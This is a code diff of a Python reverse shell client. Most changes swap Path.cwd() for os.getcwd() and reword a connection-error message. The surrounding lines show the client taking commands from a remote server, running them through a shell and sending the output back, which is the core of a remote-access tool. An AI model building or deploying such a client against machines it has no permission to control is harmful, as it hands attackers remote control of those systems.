@@ -16,8 +16,7 @@ class ReverseShellClient:
     def __init__(self):
         self.reader = None
         self.writer = None
-        self.current_directory = Path.cwd()
-        self.hostname = os.uname()
+        self.current_directory = os.getcwd()
 
     async def send_output(self, data: bytes):
         """
@@ -57,15 +56,15 @@ class ReverseShellClient:
                 try:
                     # Handle change directory (cd) command
                     if command.startswith("cd ") or command == "cd":
-                        print('[-] Changing directory. Before:', Path.cwd())
+                        print('[-] Changing directory. Before:', os.getcwd())
                         os.chdir(self.resolve_path(command[3:]))
                         self.current_directory = os.getcwd()
                         response = f"[+] Changed directory to: {self.current_directory}\n"
-                        print('[+] After:', Path.cwd())
+                        print('[+] After:', os.getcwd())
                         await self.send_output(response.encode() )
                         continue
 
-                    print(f"[>] Executing command: {command} (Current directory: {Path.cwd()})")
+                    print(f"[>] Executing command: {command} (Current directory: {os.getcwd()})")
 
                     # Execute shell command asynchronously
                     process = await asyncio.create_subprocess_shell(
@@ -91,7 +90,7 @@ class ReverseShellClient:
             print("[-] Interrupted by user. Closing connection.")
             # do something
         except ConnectionRefusedError as e:
-            print(f"[-] Connect call failed please verify the server ip and port and try again")
+            print("[-] Connection failed: Server refused the connection. Verify IP, port, and server status.")
             # do something
 
 
